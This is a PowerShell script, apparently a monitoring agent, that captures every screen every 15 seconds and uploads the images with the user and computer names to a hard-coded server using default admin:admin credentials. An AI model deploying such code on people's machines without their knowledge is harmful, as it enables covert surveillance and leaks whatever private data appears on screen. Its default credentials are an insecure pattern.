param (
    [string]$url = "http://10.0.0.10:8000",
    [string]$user = "admin",
    [string]$pass = "admin"
 )

Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$uri = $url + "/data/upload/agent"
$pair = "${user}:${pass}"

$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)

$basicAuthValue = "Basic $base64"

$headers = @{ Authorization = $basicAuthValue }


$currentComputer = $Env:Computername


$sig = @'
[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
'@

Add-Type -MemberDefinition $sig -Namespace Advapi32 -Name Util

$size = 64
$str = New-Object System.Text.StringBuilder -ArgumentList $size

[Advapi32.util]::GetUserName($str, [ref]$size) |Out-Null
$currentUser = $str.ToString()

function enrichment($data) {
    
}
function store ($data) {
    $JSON = $data | ConvertTo-Json
    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $JSON -ContentType "application/json" -Headers $headers
}


function MakeScreenshot {
    
    $screens = [Windows.Forms.Screen]::AllScreens
    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

    $stream = New-Object System.IO.MemoryStream
    $bmp.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png);

    $base64String = [Convert]::ToBase64String($stream.ToArray());
    $cur = @{ image = $base64String
        type = "screen"
        user = $currentUser
        computer = $currentComputer
        time = Get-Date -Format "dd.MM.yyyy HH:mm:ss"}
    store($cur)
    $graphics.Dispose()
    $bmp.Dispose()
}




$sw = [diagnostics.stopwatch]::StartNew()
while ($True){
    MakeScreenshot 
    start-sleep -seconds 15
}

